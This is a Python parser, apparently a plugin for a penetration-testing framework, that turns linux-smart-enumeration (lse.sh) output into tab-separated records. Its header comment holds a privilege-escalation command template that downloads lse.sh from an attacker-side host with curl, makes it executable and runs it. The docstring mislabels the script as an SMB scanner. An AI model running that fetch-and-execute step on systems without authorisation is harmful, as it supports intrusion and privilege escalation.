#!/usr/bin/python3 -u

"""
Scan smb shared drive information and output target TSV(Tab Separated Value)
"""

# [Echidna]
# pattern: .*lse.sh.*
# pattern: .*./lse.sh.*
# pattern: .*sh lse.sh.*
# pattern: sudo .* lse.sh.*
# pattern: sudo .* ./lse.sh.*
# pattern: sudo .* sh ./lse.sh.*
# name: Linux enumeration tools for privilege escalation. Please download from https://github.com/diego-treitos/linux-smart-enumeration.
# template: ./lse.sh -c -i
# template: curl "http://{localip}/lse.sh" -Lo lse.sh;chmod 700 lse.sh; ./lse.sh -i -c
# condition: {"currenthost": "^(?!.*default).*$"}
# group: Privilege Escalation Command
# [end]

import sys
import re
from urllib.parse import urlparse
from lib_command import LinesReader, type_address

log = open('/dev/null', 'w')
TARGET = re.compile(r'Target \.+ (\S*)\n')
#SECTION = re.compile(r'^=+\((.*)\)')
#SECTION = re.compile(r'^=+\( (\S+) \)')
SECTION = re.compile(r'^=+\( (users|sudo|file system|security|recurrent tasks|network|services|software|containers|processes|CVEs) \)')
ITEM = re.compile(r'^\[(i|\*|!)\].*')
RESULT = re.compile(r'.*(yes!|skip|nope)')
hostname = ""

def main(lines):
    for target in targets(LinesReader(lines)):
        print('remote', *target, sep='\t', end='')


def targets(lines):
    host = type_address(hostname)
    yield *host, 'local',  'lse-result\n'
    yield *host, 'local', 'lse-result', "basic-info\n"
    # readheader
    for line in lines:
        if "Current Output" in line:
            break
        elif not(line.isspace() or line.startswith("---")):
            yield *host, 'local', 'lse-result', "basic-info", line
    # readContents
    itemline = ""
    for line in lines:
        section = SECTION.match(line)
        if section:
            yield *host, 'local', 'lse-result', section[1]+"\n"
            for line in lines:
                if SECTION.match(line):
                    lines.unget(line)
                    break
                else:
                    if ITEM.match(line):
                        itemline = line
                        if RESULT.match(line):
                            yield *host, 'local', 'lse-result', section[1], itemline
                    elif line.startswith("---"):
                        for line in lines:
                            if line.startswith("---"):
                                break
                            else:
                                yield *host, 'local', 'lse-result', section[1], itemline.rstrip(), line
                            
'''                         else:
                            itemline = line.rstrip()
#                            while lines:
                            for line in lines:
    #                                line = next(lines)
                                if RESULT.match(line):
                                    result = RESULT.match(line)
                                    tmp = itemline + result[1]
                                    yield *host, 'local', 'lse-result', section[1], tmp+"\n"
                                    break
 '''                    
                           
#                    line = re.sub(r'\.+', "->", line)
#                    yield *host, 'local', 'lse-result', section[1], line
#            line = next(lines)


def readHeader(lines):
    yield *host, 'local', 'lse-result', "basic-info"
    for line in lines:
        if "itemline" in line:
            break
        elif not(line.isspace() or line.startswith("---")):
            yield *host, 'local', 'lse-result', "basic-info", line
        
    #            if SECTION.match(line):
        
            
if __name__ == '__main__':
    args = sys.argv
    hostname = args[1]
    main(sys.stdin)
